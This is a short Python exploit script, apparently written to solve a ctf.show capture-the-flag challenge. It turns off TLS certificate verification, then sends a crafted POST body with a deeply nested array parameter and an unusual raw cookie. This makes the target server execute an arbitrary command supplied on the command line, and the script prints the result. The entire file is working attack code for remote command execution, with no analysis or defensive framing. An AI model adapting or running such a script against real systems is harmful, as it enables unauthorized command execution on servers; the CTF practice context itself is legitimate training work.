import http.client
import ssl
import sys
from urllib.parse import quote

host = '3103fb37-f137-468c-a286-e80fe8408206.challenge.ctf.show'
cmd = sys.argv[1] if len(sys.argv) > 1 else "echo 'EVALOK';"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

body = 'a=b&c[6][0][7][5][8][0][9][4][4]=' + quote(cmd)
raw_cookie = b'CTFshow-QQ\xe7\xbe\xa4:=a'

conn = http.client.HTTPSConnection(host, context=ctx)
conn.request('POST', '/?b=c', body=body, headers={
    'Cookie': raw_cookie,
    'Content-Type': 'application/x-www-form-urlencoded',
})
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
idx = data.find('</code>')
if idx >= 0:
    print(data[idx + 7:].strip())
else:
    print(data[-1200:])

# 防闪退：Windows 双击运行完别闪关，按任意键退出
print("\n按任意键退出...")
try:
    input()
except EOFError:
    pass
